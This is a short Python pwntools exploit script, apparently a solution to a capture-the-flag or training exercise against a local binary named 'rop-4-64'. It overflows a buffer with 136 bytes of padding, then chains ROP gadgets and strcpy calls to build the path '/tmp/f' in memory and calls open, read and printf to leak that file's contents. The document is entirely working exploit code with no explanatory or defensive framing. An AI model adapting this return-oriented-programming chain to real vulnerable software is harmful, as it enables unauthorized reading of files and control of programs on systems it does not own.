from pwn import *


poprdi = p64(0x0000000000400863) #: pop rdi ; ret
poprdx = p64(0x000000000040073f) #: pop rdx ; nop ; pop rbp ; ret
poprsi = p64(0x0000000000400861) #: pop rsi ; pop r15 ; ret

def copy(pay, index, char, addr):
    pay += poprdi + p64(addr + index) + poprsi + char*2 + strcpy
    return pay

r = process("./rop-4-64")

payload = "A"*136

zero = p64(0x6003d9)
t = p64(0x600890)
m = p64(0x6008a6)
p = p64(0x6008a7)
f = p64(0x6008a0)
slash = p64(0x600908)
strcpy = p64(0x4006e2)
read = p64(0x4005b0)
printf = p64(0x4005a0)
opn = p64(0x4005d0)
addr = 0x0000000000601060

payload = copy(payload, 0, slash, addr)
payload = copy(payload, 1, t, addr)
payload = copy(payload, 2, m, addr)
payload = copy(payload, 3, p, addr)
payload = copy(payload, 4, slash, addr)
payload = copy(payload, 5, f, addr)
payload = copy(payload, 6, zero, addr)
addr = p64(addr)
payload += (poprdi + addr + poprsi + p64(0x0) * 2 + opn + poprdi + p64(0x3) + poprsi + addr *2 + poprdx + p64(0x100)*2 + read + poprdi + addr + printf)
with open("x", "w") as x:
    x.write(payload)
r.send(payload)
print r.recv(timeout = 1)


